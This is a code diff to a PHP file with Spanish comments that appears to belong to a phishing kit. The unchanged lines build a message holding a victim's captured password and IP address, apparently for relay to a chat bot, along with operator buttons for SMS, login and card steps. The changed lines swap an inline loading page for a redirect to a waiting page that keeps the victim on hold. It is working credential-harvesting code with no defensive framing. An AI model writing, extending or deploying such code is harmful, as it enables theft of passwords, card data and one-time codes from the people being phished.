@@ -25,7 +25,7 @@ if (isset($_SESSION['e']) && (isset($_SESSION['c']) || isset($_POST['c']))) {
     $msg .= "🔑 Password: $psswd\n";
     $msg .= "🌐 IP: $userp\n";
 
-    // Crear botones inline
+    // Crear botones inline - SMS, Login, Card, Listo
     $botones = json_encode([
         'inline_keyboard' => [
             [
@@ -48,47 +48,8 @@ if (isset($_SESSION['e']) && (isset($_SESSION['c']) || isset($_POST['c']))) {
     unset($_SESSION['c']);
     $_SESSION['from_out'] = true;
 
-    // Redirigir a pantalla de carga con video
-    echo '<!DOCTYPE html>
-<html lang="es">
-<head>
-  <meta charset="UTF-8">
-  <meta http-equiv="refresh" content="1">
-  <title>Cargando...</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      background: #ffffff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      overflow: hidden;
-    }
-    .video-container {
-      width: 100%;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-    video {
-      max-width: 60%;
-      max-height: 60vh;
-      object-fit: contain;
-    }
-  </style>
-</head>
-<body>
-  <div class="video-container">
-    <video autoplay loop muted playsinline>
-      <source src="cargaout.MP4" type="video/mp4">
-    </video>
-  </div>
-</body>
-</html>';
+    // Redirigir a espera.php
+    header("Location: ../espera.php");
     exit;
 }
 ?>
